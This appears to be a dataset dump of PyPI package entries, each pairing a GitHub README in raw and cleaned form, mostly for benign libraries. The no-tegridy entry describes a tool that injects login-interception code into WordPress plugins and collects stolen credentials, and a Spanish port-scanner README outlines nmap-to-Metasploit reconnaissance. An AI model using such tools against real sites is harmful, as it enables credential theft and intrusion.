2. Once you have **MSYS2** installed,  it offers you three different shells: the **MinGW32** shell, the **MinGW64** shell and **MSYS** shell. In order for the following steps to work, you have to open the **MSYS2 MinGW64** shell (you can search for this). Small hint: it has a blue color logo.
3. Run the following commands to install Python, Pango, Cython, Numpy, Scipy, Pillow, Pycairo and ffmpeg
```sh
pacman -S mingw-w64-x86_64-python
pacman -S mingw-w64-x86_64-python-pip
pacman -S mingw-w64-x86_64-pango
pacman -S mingw-w64-x86_64-cython
pacman -S mingw-w64-x86_64-python-numpy
pacman -S mingw-w64-x86_64-python-scipy
pacman -S mingw-w64-x86_64-python-pillow
pacman -S mingw-w64-x86_64-python-cairo
pacman -S mingw-w64-x86_64-ffmpeg
```
4. Still in the same shell, install **Manim** using `pip install manim`.
5. Finally, get your clone of **ManimPango**, `cd` into that directory and then run `pip install -e .`.
**Note** You can't use it with your regular Python version. It will cause weird errors if you do so. For working with **ManimPango**, you must be inside the `MSYS2 MINGW64 shell`.
6. You can then use `manim` inside that shell, to run **Manim**.
**Hint**: If you want to try out Python interactively, you can open `idle` using the command `python -m idlelib`  inside that shell.

#### Visual Studio

First, install Visual Studio as specified in https://wiki.python.org/moin/WindowsCompilers. Possibly Visual Studio Build Tools 2019 with Windows10 SDK.

Then run the script at `packing/download_dlls.py`. This will get a **Pango** build along with `pkg-config` and install it at `C:\cibw\vendor`. Add `C:\cibw\vendor\bin` and `C:\cibw\vendor\pkg-config\bin` to PATH.

**Note:** You can change the install location by editing line 24 of the file `packing/download_dlls.py`.

Then set an environment variable `PKG_CONFIG_PATH`=`C:\cibw\vendor\lib\pkgconfig`.

Then you can install Cython using

```sh
pip install Cython
```

Finally, you can install your local **ManimPango** clone just like any other python package by typing:

```sh
pip install .
```

**Important**: You have to to use https://docs.python.org/3/library/os.html#os.add_dll_directory before running **ManimPango**. Alternatively, you need to copy the `dll` at `C:\cibw\vendor\bin` to the folder where **ManimPango** is compiled.  This is applicable for Python 3.8 and above.

```python
import os
os.add_dll_directory('C:\cibw\vendor\bin')
```

## Code of Conduct

Our full code of conduct, and how we enforce it, can be read on [our website](https://docs.manim.community/en/latest/conduct.html).

## License

This project is licensed under MIT License. The wheels distributed on PyPI contains compiled version of Pango and Cairo subject to terms of the GNU LGPL and other licenses. Consult the licenses of each library for more informations.
",manimcommunity/manimpango
python-switchbot-ble,https://github.com/carlsondev/python-switchbot-ble,1,274,274,"# Python SwitchBot BLE

A reverse engineered Bluetooth Low Energy Python API for the SwitchBot Bot. 

## Installation

```
$ pip install python-switchbot-ble
```

## Usage

`examples` folder gives basic implementations


Originally made for Cyber Physical Systems Security.
","# Python SwitchBot BLE

A reverse engineered Bluetooth Low Energy Python API for the SwitchBot Bot. 

## Installation

```
$ pip install python-switchbot-ble
```

## Usage

`examples` folder gives basic implementations


Originally made for Cyber Physical Systems Security.
",carlsondev/python-switchbot-ble
vue2img,https://github.com/Drelf2018/vue2img,0,101,101,"# vue2img
 将 vue 文件编译为图片

```python
createApp(1000).mount(config).export().canvas.show()
```

","# vue2img
 将 vue 文件编译为图片

```python
createApp(1000).mount(config).export().canvas.show()
```

",drelf2018/vue2img
idgenerators,https://github.com/ArjanCodes/2023-package,3,74,74,"# ID Generator
A package used to generate random ids of variable length
","# ID Generator
A package used to generate random ids of variable length
",arjancodes/2023-package
tsdf,https://github.com/biomarkersParkinson/tsdf,5,1293,1293,"
![Python package](https://github.com/biomarkersparkinson/tsdf/workflows/Python%20package/badge.svg)

# tsdf

A package to load [TSDF data](https://arxiv.org/abs/2211.11294) into Python

## Installation

Download or clone the content of [our repository](https://github.com/biomarkersParkinson/tsdf) and install using `poetry` or `pip`.

### Using `poetry` (recommended)

```bash
poetry install
```

### Using `pip`

```bash
$ pip install tsdf
```

## Usage

- TODO

## Development

### Running tests

```bash
poetry install
poetry run pytest
```

## Contributing

Interested in contributing? Check out the contributing guidelines. Please note that this project is released with a Code of Conduct. By contributing to this project, you agree to abide by its terms.

## License

This package was created by Pablo Rodríguez, Peter Kok and Vedran Kasalica. It is licensed under the terms of the Apache License 2.0 license.

## Credits

- The [TSDF data format](https://arxiv.org/abs/2211.11294) was created by Kasper Claes, Valentina Ticcinelli, Reham Badawy, Yordan P. Raykov, Luc J.W. Evers, Max A. Little.
- This package was created with [`cookiecutter`](https://cookiecutter.readthedocs.io/en/latest/) and the `py-pkgs-cookiecutter` [template](https://github.com/py-pkgs/py-pkgs-cookiecutter).
","
![Python package](https://github.com/biomarkersparkinson/tsdf/workflows/Python%20package/badge.svg)

# tsdf

A package to load [TSDF data](https://arxiv.org/abs/2211.11294) into Python

## Installation

Download or clone the content of [our repository](https://github.com/biomarkersParkinson/tsdf) and install using `poetry` or `pip`.

### Using `poetry` (recommended)

```bash
poetry install
```

### Using `pip`

```bash
$ pip install tsdf
```

## Usage

- TODO

## Development

### Running tests

```bash
poetry install
poetry run pytest
```

## Contributing

Interested in contributing? Check out the contributing guidelines. Please note that this project is released with a Code of Conduct. By contributing to this project, you agree to abide by its terms.

## License

This package was created by Pablo Rodríguez, Peter Kok and Vedran Kasalica. It is licensed under the terms of the Apache License 2.0 license.

## Credits

- The [TSDF data format](https://arxiv.org/abs/2211.11294) was created by Kasper Claes, Valentina Ticcinelli, Reham Badawy, Yordan P. Raykov, Luc J.W. Evers, Max A. Little.
- This package was created with [`cookiecutter`](https://cookiecutter.readthedocs.io/en/latest/) and the `py-pkgs-cookiecutter` [template](https://github.com/py-pkgs/py-pkgs-cookiecutter).
",biomarkersparkinson/tsdf
no-tegridy,https://github.com/michaelvanstraten/no-tegridy,4,693,693,"![Image of Randy Marsh](./header-image.webp)

# no-tegridy

`no-tegridy` is a small red team script for injecting login interception code into existing WordPress plugins.

## Installation

To install the script just run:

```bash
pip install no-tegridy
```

## Command overview

To inject the login interception code into a plugin run the `inject` command.
If you would like to have and overview of the available options run:

```bash
no-tegridy inject --help
```

In order to fetch logged data from a WordPress instance,
with the respectively installed plugin, run the `fetch` command.
If you would like to have and overview of the available options run:

```bash
no-tegridy fetch --help
```
","![Image of Randy Marsh](./header-image.webp)

# no-tegridy

`no-tegridy` is a small red team script for injecting login interception code into existing WordPress plugins.

## Installation

To install the script just run:

```bash
pip install no-tegridy
```

## Command overview

To inject the login interception code into a plugin run the `inject` command.
If you would like to have and overview of the available options run:

```bash
no-tegridy inject --help
```

In order to fetch logged data from a WordPress instance,
with the respectively installed plugin, run the `fetch` command.
If you would like to have and overview of the available options run:

```bash
no-tegridy fetch --help
```
",michaelvanstraten/no-tegridy
pip-package-template-docker,https://github.com/MichaelKim0407/pip-package-template-docker,13,3733,3733,"# pip-package-template-docker

[![Release Status](https://github.com/MichaelKim0407/pip-package-template-docker/actions/workflows/python-publish.yml/badge.svg)](https://github.com/MichaelKim0407/pip-package-template-docker/releases)
[![PyPI package](https://badge.fury.io/py/pip-package-template-docker.svg)](https://pypi.org/project/pip-package-template-docker)
[![Supported Python versions](https://img.shields.io/pypi/pyversions/pip-package-template-docker)](https://pypi.org/project/pip-package-template-docker)
[![Build Status](https://github.com/MichaelKim0407/pip-package-template-docker/actions/workflows/test.yml/badge.svg?branch=main)](https://github.com/MichaelKim0407/pip-package-template-docker/tree/main)
[![Coverage Status](https://coveralls.io/repos/github/MichaelKim0407/pip-package-template-docker/badge.svg?branch=main)](https://coveralls.io/github/MichaelKim0407/pip-package-template-docker?branch=main)

Project template for Dockerized pip package development.

## Overview

1. This project is fully Dockerized. For convenience, a [`Makefile`](Makefile) is provided to build/test during development.
2. Python 3.11 is the primary version for development, while 3.7 - 3.10 are included for compatibility. You may want to change them in the future.
   See [`docker-compose.yml`](docker-compose.yml) and [`Makefile`](Makefile).
   Refer to [this page](https://devguide.python.org/versions/) for Python versions you may want to support.
3. Linting is done using `flake8` and testing is done using `pytest`.
4. CI is designed for GitHub Actions. See [`.github`](.github). Coverage is reported to [Coveralls](https://coveralls.io/).
5. An automatic release to Pypi is made through GitHub Actions whenever you publish a new release on GitHub.
6. `LICENSE` in the template is MIT.

## How to use

1. Please familiarize yourself with all the concept involved. I am not responsible for things breaking if you use this template.
   * Python and different Python versions
   * Creating pip packages. I made a tutorial a few years ago, which you can see [here](https://github.com/MichaelKim0407/tutorial-pip-package).
   * Docker and docker-compose
   * Linting and flake8
   * Unit testing and pytest
   * CI and GitHub Actions
   * Code coverage
2. Find all instances of `pip-package-template-docker` and replace them with your desired package name.
   This is the **name** of your package known to Pypi and `pip install`.
3. Rename the [`src/pip_package_template_docker`](src/pip_package_template_docker) folder.
   Find all instances of `pip_package_template_docker` and replace them accordingly.
   This is what your `import` statement would use in Python code.
4. Go through [`src/setup.py`](src/setup.py) and make necessary changes. Please do not link your project to my name, email, or GitHub.
5. Replace [`README.md`](README.md) with your own. If you would like to use the badges, please change the links to point to your project.
6. Replace [`LICENSE`](LICENSE) with your own. Please do not license your project under my name.
7. Project version is found in the [`__init__.py`](src/pip_package_template_docker/__init__.py) file in your package.
   Update it accordingly as you develop your package.
8. Put unittests under [`src/tests`](src/tests).
9. Sign up for necessary accounts, such as [Pypi](https://pypi.org/) and [Coveralls](https://coveralls.io/).
10. Acquire a Pypi token and put it under your project as `PYPI_API_TOKEN`.
    On Pypi it is found under Account settings -> API tokens -> Add API token.
    On GitHub it is located in your project settings -> Security -> Secrets and variables -> Repository secrets.
    You may need to manually update once before a project-specific token can be acquired.
","# pip-package-template-docker

[![Release Status](https://github.com/MichaelKim0407/pip-package-template-docker/actions/workflows/python-publish.yml/badge.svg)](https://github.com/MichaelKim0407/pip-package-template-docker/releases)
[![PyPI package](https://badge.fury.io/py/pip-package-template-docker.svg)](https://pypi.org/project/pip-package-template-docker)
[![Supported Python versions](https://img.shields.io/pypi/pyversions/pip-package-template-docker)](https://pypi.org/project/pip-package-template-docker)
[![Build Status](https://github.com/MichaelKim0407/pip-package-template-docker/actions/workflows/test.yml/badge.svg?branch=main)](https://github.com/MichaelKim0407/pip-package-template-docker/tree/main)
[![Coverage Status](https://coveralls.io/repos/github/MichaelKim0407/pip-package-template-docker/badge.svg?branch=main)](https://coveralls.io/github/MichaelKim0407/pip-package-template-docker?branch=main)

Project template for Dockerized pip package development.

## Overview

1. This project is fully Dockerized. For convenience, a [`Makefile`](Makefile) is provided to build/test during development.
2. Python 3.11 is the primary version for development, while 3.7 - 3.10 are included for compatibility. You may want to change them in the future.
   See [`docker-compose.yml`](docker-compose.yml) and [`Makefile`](Makefile).
   Refer to [this page](https://devguide.python.org/versions/) for Python versions you may want to support.
3. Linting is done using `flake8` and testing is done using `pytest`.
4. CI is designed for GitHub Actions. See [`.github`](.github). Coverage is reported to [Coveralls](https://coveralls.io/).
5. An automatic release to Pypi is made through GitHub Actions whenever you publish a new release on GitHub.
6. `LICENSE` in the template is MIT.

## How to use

1. Please familiarize yourself with all the concept involved. I am not responsible for things breaking if you use this template.
   * Python and different Python versions
   * Creating pip packages. I made a tutorial a few years ago, which you can see [here](https://github.com/MichaelKim0407/tutorial-pip-package).
   * Docker and docker-compose
   * Linting and flake8
   * Unit testing and pytest
   * CI and GitHub Actions
   * Code coverage
2. Find all instances of `pip-package-template-docker` and replace them with your desired package name.
   This is the **name** of your package known to Pypi and `pip install`.
3. Rename the [`src/pip_package_template_docker`](src/pip_package_template_docker) folder.
   Find all instances of `pip_package_template_docker` and replace them accordingly.
   This is what your `import` statement would use in Python code.
4. Go through [`src/setup.py`](src/setup.py) and make necessary changes. Please do not link your project to my name, email, or GitHub.
5. Replace [`README.md`](README.md) with your own. If you would like to use the badges, please change the links to point to your project.
6. Replace [`LICENSE`](LICENSE) with your own. Please do not license your project under my name.
7. Project version is found in the [`__init__.py`](src/pip_package_template_docker/__init__.py) file in your package.
   Update it accordingly as you develop your package.
8. Put unittests under [`src/tests`](src/tests).
9. Sign up for necessary accounts, such as [Pypi](https://pypi.org/) and [Coveralls](https://coveralls.io/).
10. Acquire a Pypi token and put it under your project as `PYPI_API_TOKEN`.
    On Pypi it is found under Account settings -> API tokens -> Add API token.
    On GitHub it is located in your project settings -> Security -> Secrets and variables -> Repository secrets.
    You may need to manually update once before a project-specific token can be acquired.
",michaelkim0407/pip-package-template-docker
python-scan,https://github.com/TownPablo/PORT_SCANNER,7,1088,1088,"#                   PORT_SCANNER

#               Autor: __TownPablo__



  --  Usabilidad 'PORT SCANNER' v0.4.0  --       

Argumentos de la herramienta:

[♦] Enter IP --> IP OBETIVO    

    ║       
    ╚═► EJEMPLO --> [♦] ENTER IP -> 127.0.0.1

[♦] Introduce la cantidad de puertos a escanear - (EJ: 500 - Primeros 500)

    ║               
    ╚═► EJEMPLO --> Introduce cant ports --> 65535 (nº MAX ports)


   -- PROCEDIMIENTO UTILIZADO POR LA HERRAMIENTA --
          
1. Se ejecuta un escaneo de puertos para localizar los abiertos

2. Ejecutamos un analisis de servicios de dichos puertos abiertos,
   identificamos información sobre los servicios encontrados 

3. Iniciamos una busqueda de vulnerabilidades públicas en dichos servicios...

4. Tenemos la opcion de buscar en la base de datos de ExploitDb algún exploit público.

5. Podemos abrir metasploit para utilziar la informacion recopilada
   anteriomente para lo que tengamos que hacer

REQUISITOS:
            - NMAP
            - Metasploit (opcional)
            
            
","#                   PORT_SCANNER

#               Autor: __TownPablo__



  --  Usabilidad 'PORT SCANNER' v0.4.0  --       

Argumentos de la herramienta:

[♦] Enter IP --> IP OBETIVO    

    ║       
    ╚═► EJEMPLO --> [♦] ENTER IP -> 127.0.0.1

[♦] Introduce la cantidad de puertos a escanear - (EJ: 500 - Primeros 500)

    ║               
    ╚═► EJEMPLO --> Introduce cant ports --> 65535 (nº MAX ports)


   -- PROCEDIMIENTO UTILIZADO POR LA HERRAMIENTA --
          
1. Se ejecuta un escaneo de puertos para localizar los abiertos

2. Ejecutamos un analisis de servicios de dichos puertos abiertos,
   identificamos información sobre los servicios encontrados 

3. Iniciamos una busqueda de vulnerabilidades públicas en dichos servicios...

4. Tenemos la opcion de buscar en la base de datos de ExploitDb algún exploit público.

5. Podemos abrir metasploit para utilziar la informacion recopilada
   anteriomente para lo que tengamos que hacer

REQUISITOS:
            - NMAP
            - Metasploit (opcional)
            
            
",townpablo/port_scanner
georef-ar-py,https://github.com/pavloae/georef-ar-py,1,94,94,"# georef-ar-py
Paquete para consultas y procesamiento de respuestas sobre la API de georef-ar
","# georef-ar-py
Paquete para consultas y procesamiento de respuestas sobre la API de georef-ar
",pavloae/georef-ar-py
airflow-kubernetes-job-operator-test25,https://github.com/LamaAni/KubernetesJobOperator,5,72,72,"Please see readme.md @ https://github.com/LamaAni/KubernetesJobOperator
","Please see readme.md @ https://github.com/LamaAni/KubernetesJobOperator
",lamaani/kubernetesjoboperator
odoo14-addon-crm-lead-currency,https://github.com/OCA/crm,1,3426,3065,"=================
CRM Lead Currency
=================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fcrm-lightgray.png?logo=github
    :target: https://github.com/OCA/crm/tree/14.0/crm_lead_currency
    :alt: OCA/crm
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/crm-14-0/crm-14-0-crm_lead_currency
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/111/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module allows to select a specific currency for a lead or an opportunity.
If the selected currency is different to the company currency, an amount in the customer
currency can be set and the expected revenue of the opportunity will automatically be
computed in the company currency. The default rate used for the computation is the rate
of the day.

**Table of contents**

.. contents::
   :local:

Installation
============

Just install the module.

Configuration
=============

No specific configuration is needed but multi-currency should be enabled for the module
to make sense.

Usage
=====

To use this module, you need to:

#. Created a new opportunity in the CRM and set a customer currency on it.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/crm/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/crm/issues/new?body=module:%20crm_lead_currency%0Aversion:%2014.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Camptocamp SA
* Vauxoo

Contributors
~~~~~~~~~~~~

* Thierry Ducrest <thierry.ducrest@camptocamp.com>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-luisg123v| image:: https://github.com/luisg123v.png?size=40px
    :target: https://github.com/luisg123v
    :alt: luisg123v

Current `maintainer <https://odoo-community.org/page/maintainer-role>`__:

|maintainer-luisg123v| 

This module is part of the `OCA/crm <https://github.com/OCA/crm/tree/14.0/crm_lead_currency>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","=================
CRM Lead Currency
=================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fcrm-lightgray.png?logo=github
    :target: https://github.com/OCA/crm/tree/14.0/crm_lead_currency
    :alt: OCA/crm
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/crm-14-0/crm-14-0-crm_lead_currency
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/111/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module allows to select a specific currency for a lead or an opportunity.
If the selected currency is different to the company currency, an amount in the customer
currency can be set and the expected revenue of the opportunity will automatically be
computed in the company currency. The default rate used for the computation is the rate
of the day.

**Table of contents**

.. contents::
   :local:

Installation
============

Just install the module.

Configuration
=============

No specific configuration is needed but multi-currency should be enabled for the module
to make sense.

Usage
=====

To use this module, you need to:

#. Created a new opportunity in the CRM and set a customer currency on it.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Camptocamp SA
* Vauxoo

Contributors
~~~~~~~~~~~~

* Thierry Ducrest 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-luisg123v| image:: https://github.com/luisg123v.png?size=40px
    :target: https://github.com/luisg123v
    :alt: luisg123v

Current `maintainer `__:

|maintainer-luisg123v| 

This module is part of the `OCA/crm `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/crm
cset,https://github.com/MetOffice/CSET,4,1509,1465,"# CSET

CSET is a tool to aid in evaluating regional model configurations. It aims to
replace the collection of bespoke scripts littering people’s home directories,
reducing effort wasted on duplicating already existing code. This centralisation
of diagnostics should also make evaluations more consistent and comparable.
Development takes place in the CSET repository on GitHub.

Please read [the documentation](https://metoffice.github.io/CSET) to learn more
about CSET, and how to use it.

## Contributing

Contributions are readily welcomed! To get started with developing CSET visit
the [Working
Practices](https://metoffice.github.io/CSET/working-practices/#getting-started)
section of the documentation.

In addition to reading the working practices, the key
recommendation is early communication. Open an [issue on
Github](https://github.com/MetOffice/CSET/issues) with your proposed change or
addition in the design phase, and then others can provide guidance early.

## Licence

Copyright © 2022-2023 Met Office and contributors.

Licensed under the [Apache License, Version 2.0](LICENCE) (the ""License""); You
may obtain a copy of the License at

<http://www.apache.org/licenses/LICENSE-2.0>

Unless required by applicable law or agreed to in writing, software distributed
under the License is distributed on an ""AS IS"" BASIS, WITHOUT WARRANTIES OR
CONDITIONS OF ANY KIND, either express or implied. See the License for the
specific language governing permissions and limitations under the License.
","# CSET

CSET is a tool to aid in evaluating regional model configurations. It aims to
replace the collection of bespoke scripts littering people’s home directories,
reducing effort wasted on duplicating already existing code. This centralisation
of diagnostics should also make evaluations more consistent and comparable.
Development takes place in the CSET repository on GitHub.

Please read [the documentation](https://metoffice.github.io/CSET) to learn more
about CSET, and how to use it.

## Contributing

Contributions are readily welcomed! To get started with developing CSET visit
the [Working
Practices](https://metoffice.github.io/CSET/working-practices/#getting-started)
section of the documentation.

In addition to reading the working practices, the key
recommendation is early communication. Open an [issue on
Github](https://github.com/MetOffice/CSET/issues) with your proposed change or
addition in the design phase, and then others can provide guidance early.

## Licence

Copyright © 2022-2023 Met Office and contributors.

Licensed under the [Apache License, Version 2.0](LICENCE) (the ""License""); You
may obtain a copy of the License at



Unless required by applicable law or agreed to in writing, software distributed
under the License is distributed on an ""AS IS"" BASIS, WITHOUT WARRANTIES OR
CONDITIONS OF ANY KIND, either express or implied. See the License for the
specific language governing permissions and limitations under the License.
",metoffice/cset
merkleasy,https://github.com/k98kurz/merkle,0,5865,5865,"# Merkle Structures

This is a simple-to-use implementation of the concept of Merklized data
structures, e.g. the Merkle Tree and the Merkle Mountain Range. There is a
single class, `merkleasy.Tree`, with a simple interface. See the Usage section for
details. This uses sha256 as the hash algorithm.

# Status

- [x] Interface
- [x] Tests
- [x] Implementation
- [x] Proofs
- [x] Usage Documentation
- [ ] Publish to pypi

# Installation

```bash
pip install merkleasy
```

# Testing

To develop or test, fork or clone the repo. There are no dependencies.

There is just one test file. Run it with the following:

```bash
python tests/test_classes.py
```

This file demonstrates all the intended behaviors of the class and rules out
many unintended behaviors. It uses `randint` and many repetitions to ensure that
the test is thorough. The tests are also a form of technical documentation; any
questions about the code can likely be answered by reading through them.

# Usage

Usage examples are shown below.

## from_leaves

The easiest way to use this to create a Merkle Tree is with `from_leaves`:

```py
from merkleasy import Tree

leaves = [b'leaf1', b'leaf2', b'leaf3', b'leaf4', b'etc']
tree = Tree.from_leaves(leaves)
```

Note that all leaves are hashed by the `from_leaves` method.

## __init__

To make custom Merklized data structures, use the `__init__` method:

```py
from hashlib import sha256
from merkleasy import Tree

leaf1 = sha256(b'leaf1').digest()
leaf2 = sha256(b'leaf2').digest()
leaf3 = sha256(b'leaf3').digest()
leaf4 = sha256(b'leaf4').digest()
leaf5 = sha256(b'leaf5').digest()

tree = Tree(
    leaf1,
    Tree(
        Tree(leaf2, leaf3),
        Tree(leaf4, leaf5)
    )
)
```

## to_dict and from_dict

A Tree structure can be converted to a dict and back.

```py
from merkleasy import Tree

tree = Tree.from_leaves([b'leaf1', b'leaf2', b'leaf3'])
converted = tree.to_dict()
deconverted = Tree.from_dict(converted)
```

## to_json and from_json

Serialization and deserialization of a structure uses `to_json` and `from_json`:

```py
from merkleasy import Tree

tree = Tree.from_leaves([b'leaf1', b'leaf2', b'leaf3'])
serialized = tree.to_json()
pretty = tree.to_json(pretty=True)
deserialized = Tree.from_json(serialized)
assert deserialized == Tree.from_json(pretty)
```

## prove

Inclusion proofs can be generated using the `prove` method:

```py
from merkleasy import Tree

tree = Tree.from_leaves([b'leaf1', b'leaf2', b'leaf3'])
proof = tree.prove(b'leaf2')
```

Each inclusion proof is a list of bytes, where the first byte in each item in
the list is one of the codes from `interfaces.ProofOp`. An optional parameter,
`verbose`, can be set to `True` in the call to `prove` if the proof should
include checks for intermediate values; if `verbose` is left to the default
`False` value, a shorter proof that checks only the final hash will be produced.
There are no security advantages to using verbose proofs; it is primarily useful
for manual inspection by including intermediate, calculated values. However, the
functionality exists as a side-effect of preventing malicious proofs from
tricking the validator -- `test_Tree_verify_does_not_validate_malicious_proof`
contains an example attack.

## verify

Inclusion proofs can be verified using `Tree.verify`:

```py
from merkleasy import Tree

tree = Tree.from_leaves([b'leaf1', b'leaf2', b'leaf3'])
leaf = b'leaf1'
proof1 = tree.prove(leaf)
proof2 = tree.prove(b'leaf2')

try:
    Tree.verify(tree.root, leaf, proof1)
    # expected result
    print(f'verified proof {[p.hex() for p in proof1]} for {leaf=}')
except ValueError as e:
    print('invalid proof supplied')
except AssertionError as e:
    print(f'error encountered: {e}')

try:
    Tree.verify(tree.root, leaf, [b'\x99', *proof2])
    print(f'verified proof {[p.hex() for p in proof2]} for {leaf=}')
except ValueError as e:
    # expected result
    print('invalid proof supplied')
except AssertionError as e:
    print(f'error encountered: {e}')

try:
    Tree.verify(tree.root, leaf, proof2)
    print(f'verified proof {[p.hex() for p in proof2]} for {leaf=}')
except ValueError as e:
    print('invalid proof supplied')
except AssertionError as e:
    # expected result
    print(f'error encountered: {e}')
```

This static method parses the proof, interpreting the first byte in each proof
step as a code from `interfaces.ProofOp`. It ensures that the proof starts with
the leaf and ends with the root, and then it follows the proof operations.

If the call to `Tree.verify` is provided invalid parameters or an invalid proof,
it will throw an `AssertionError` or `ValueError`. If all checks pass, it
executes without error and returns `None`.


# ISC License

Copyleft (c) 2023 k98kurz

Permission to use, copy, modify, and/or distribute this software
for any purpose with or without fee is hereby granted, provided
that the above copyleft notice and this permission notice appear in
all copies.

Exceptions: this permission is not granted to Alphabet/Google, Amazon,
Apple, Microsoft, Netflix, Meta/Facebook, Twitter, or Disney; nor is
permission granted to any company that contracts to supply weapons or
logistics to any national military; nor is permission granted to any
national government or governmental agency; nor is permission granted to
any employees, associates, or affiliates of these designated entities.

THE SOFTWARE IS PROVIDED ""AS IS"" AND THE AUTHOR DISCLAIMS ALL
WARRANTIES WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE
AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR
CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS
OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT,
NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
","# Merkle Structures

This is a simple-to-use implementation of the concept of Merklized data
structures, e.g. the Merkle Tree and the Merkle Mountain Range. There is a
single class, `merkleasy.Tree`, with a simple interface. See the Usage section for
details. This uses sha256 as the hash algorithm.

# Status

- [x] Interface
- [x] Tests
- [x] Implementation
- [x] Proofs
- [x] Usage Documentation
- [ ] Publish to pypi

# Installation

```bash
pip install merkleasy
```

# Testing

To develop or test, fork or clone the repo. There are no dependencies.

There is just one test file. Run it with the following:

```bash
python tests/test_classes.py
```

This file demonstrates all the intended behaviors of the class and rules out
many unintended behaviors. It uses `randint` and many repetitions to ensure that
the test is thorough. The tests are also a form of technical documentation; any
questions about the code can likely be answered by reading through them.

# Usage

Usage examples are shown below.

## from_leaves

The easiest way to use this to create a Merkle Tree is with `from_leaves`:

```py
from merkleasy import Tree

leaves = [b'leaf1', b'leaf2', b'leaf3', b'leaf4', b'etc']
tree = Tree.from_leaves(leaves)
```

Note that all leaves are hashed by the `from_leaves` method.

## __init__

To make custom Merklized data structures, use the `__init__` method:

```py
from hashlib import sha256
from merkleasy import Tree

leaf1 = sha256(b'leaf1').digest()
leaf2 = sha256(b'leaf2').digest()
leaf3 = sha256(b'leaf3').digest()
leaf4 = sha256(b'leaf4').digest()
leaf5 = sha256(b'leaf5').digest()

tree = Tree(
    leaf1,
    Tree(
        Tree(leaf2, leaf3),
        Tree(leaf4, leaf5)
    )
)
```

## to_dict and from_dict

A Tree structure can be converted to a dict and back.

```py
from merkleasy import Tree

tree = Tree.from_leaves([b'leaf1', b'leaf2', b'leaf3'])
converted = tree.to_dict()
deconverted = Tree.from_dict(converted)
```

## to_json and from_json

Serialization and deserialization of a structure uses `to_json` and `from_json`:

```py
from merkleasy import Tree

tree = Tree.from_leaves([b'leaf1', b'leaf2', b'leaf3'])
serialized = tree.to_json()
pretty = tree.to_json(pretty=True)
deserialized = Tree.from_json(serialized)
assert deserialized == Tree.from_json(pretty)
```

## prove

Inclusion proofs can be generated using the `prove` method:

```py
from merkleasy import Tree

tree = Tree.from_leaves([b'leaf1', b'leaf2', b'leaf3'])
proof = tree.prove(b'leaf2')
```

Each inclusion proof is a list of bytes, where the first byte in each item in
the list is one of the codes from `interfaces.ProofOp`. An optional parameter,
`verbose`, can be set to `True` in the call to `prove` if the proof should
include checks for intermediate values; if `verbose` is left to the default
`False` value, a shorter proof that checks only the final hash will be produced.
There are no security advantages to using verbose proofs; it is primarily useful
